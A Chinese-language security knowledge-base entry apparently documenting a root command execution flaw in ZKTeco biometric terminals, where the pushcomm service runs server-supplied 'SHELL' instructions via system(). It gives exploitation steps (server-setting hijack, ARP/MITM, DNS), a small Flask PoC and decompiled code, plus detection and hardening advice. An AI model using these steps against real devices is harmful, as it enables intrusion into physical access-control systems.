---
id: iot-protocol-zkteco-pushcomm-shell-command-server-hijack
title: ZKTeco pushcomm 云服务 SHELL 指令：把设备指向恶意 HTTP 服务器即执行任意 root 命令
type: scenario
domain: iot
path: iot/protocol
technique: zkteco-pushcomm-shell-command-server-hijack
aliases:
- pushcomm SHELL
- ZKTeco 云服务命令执行
- ADMS 服务器劫持
- 4370 pushcomm RCE
- iclock getrequest SHELL
tags:
- iot
- zkteco
- biometric-terminal
- pushcomm
- http-client
- command-injection
- rce
- mitm
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V322
  verified_at: '2026-11-08T15:55:01+08:00'
  notes: 已对照 img43-46 与原文核对 ADMS 云服务配置、SHELL 分支 snprintf/system 与 Flask 返回 C:118:SHELL；未在真机复跑。
---

## 一句话结论

ZKTeco 终端的 `pushcomm` 服务会作为 HTTP 客户端轮询管理员配置的云服务器；当服务器返回 `SHELL:<命令>` 指令时，它把命令后半段直接交给 `system("%s >%s 2>&1")` 执行。攻击者只要通过管理菜单/数据库修改服务器地址、或 ARP 欺骗/MITM 把设备流量劫持到自己的 HTTP 服务器，返回一条 `SHELL` 指令即可在设备上以 root 执行任意命令。

## 原理

- `pushcomm` 运行在设备上（原文 ps 显示为 root），负责向 "Cloud Server Setting" 中配置的服务器地址/端口发送请求；服务器类型为 ADMS，可配置 IP、端口、是否 HTTPS 等。
- 反编译 `pushcomm` 可见命令处理分支：`if (!strncasecmp(CmdData, "SHELL", 5u)) { ... snprintf(OS_cmd, 0x64, "%s >%s 2>&1", CmdData + 6, OutFilePath); ret = system(OS_cmd); }`。`CmdData+6` 就是服务器返回的任意命令字符串，直接进入 `system()`。
- 攻击者只需要控制设备所信任的服务器响应：
  1. 管理员菜单/数据库修改 Cloud Server Setting，把地址指向攻击者；
  2. 或 ARP 欺骗/MITM 局域网内设备的 HTTP 请求，伪造响应；
  3. 或 DNS 劫持域名（若配置了域名）。
- 设备以 root 运行 `pushcomm`，因此 `SHELL` 指令直接获得 root 命令执行；原文用 Flask 模拟服务器返回 `C:118:SHELL:ls -la > /tmp/123;` 验证。
- 这是"信任服务器"架构的典型问题：设备把云端下发的指令当可信命令执行，没有签名/来源校验，HTTP（非 HTTPS 或未校验证书）时可被中间人利用。

## 触发条件

- 设备配置了云服务器地址（ADMS/push 模式），`pushcomm` 正常运行并可出网访问该地址。
- 攻击者能修改设备配置（管理员/数据库/配置接口）、控制 DNS，或在设备到服务器的路径上做 ARP 欺骗/MITM。
- 服务器通信未使用双向认证/签名，或 HTTPS 未严格校验证书（原文配置中 HTTPS 可开关）。
- `pushcomm` 以 root 运行（默认）。

## 利用步骤

1. 确认设备处于 push/ADMS 模式，`pushcomm` 在运行（ps 可见 `/mnt/mtdblock/service/pushcomm`），并记录其配置的服务器地址/端口。
2. 选择劫持方式：修改管理菜单 "Cloud Server Setting" 指向攻击者 IP:port；或 ARP 欺骗设备与网关，伪造 HTTP 响应；或 DNS 劫持。
3. 在攻击机启动 HTTP 服务器，按设备请求路径返回包含 `SHELL` 指令的响应体，例如 `C:118:SHELL:ls -la > /tmp/123;`。
4. 设备解析响应后执行命令；用设备上可读的路径/协议文件读取接口取回输出，或让命令外带（curl/wget）。
5. 验证到 `id` 输出 `uid=0(root)` 即停止；进一步可写 SSH key、修改数据库或反弹 shell。
6. 清理：恢复设备服务器配置，撤销 ARP/DNS 劫持。

## PoC

```python
# 模拟恶意云服务器（原文 Flask 思路）
from flask import Flask
app = Flask(__name__)

@app.route('/iclock/getrequest', methods=['GET'])
def getrequest():
    return "C:118:SHELL:ls -la > /tmp/123;"
```

```text
# 反编译命令处理逻辑
if (!strncasecmp(CmdData, "SHELL", 5u)) {
    strncpy(v146, CmdData, 5u);
    if (strncasecmp(CmdData + 6, "reboot", 6u)) {
        snprintf(OS_cmd, 0x64, "%s >%s 2>&1", CmdData + 6, OutFilePath);
        ret = system(OS_cmd);
    }
}
```

```text
# 设备端配置
Cloud Server Setting -> Server address = attacker-ip, Port = 8081, HTTPS = off/on
```

## 变体与关联

- 变体：若只能改配置不能 MITM，可直接把服务器地址改为攻击者；若只能 MITM，保持原地址不变，伪造响应即可。
- 变体：同服务的 SQL 注入/其他命令分支可与 `SHELL` 组合；`pushcomm` 与 `standalonecomm` 代码有大量重叠。
- 关联：[[iot-protocol-zkteco-4370-comkey-reversible-mac-auth]]（本地协议认证）、[[iot-protocol-zkteco-standalonecomm-delete-picture-command-injection]]（另一服务的命令注入）、[[iot-protocol-zkteco-standalonecomm-download-picture-path-traversal]]（文件读取）。
- 边界：设备不配置云服务器/不启用 push、只能出网到受控服务器、HTTPS 严格校验证书且攻击者无法伪造时，MITM 路线不成立；但配置修改路线仍可能成立。

## 检测与防御

- 检测：设备向非预期服务器地址/端口发起 HTTP 请求；请求/响应中出现 `SHELL`、`reboot`；`pushcomm` 派生的 `sh -c` 命令行异常；设备 `/tmp` 出现异常输出文件。
- 防御：云服务器通信使用 HTTPS 并严格校验证书/做双向认证，服务器下发命令加签名并验证；不要在设备端把服务器响应当 shell 命令执行。
- 防御：保护设备管理菜单与数据库配置，限制可修改服务器地址的角色；网络侧防 ARP 欺骗（DAI/静态 ARP）、DNS 安全。
- 加固：`pushcomm` 以非 root 运行；关闭不需要的云服务；升级固件修复命令注入。
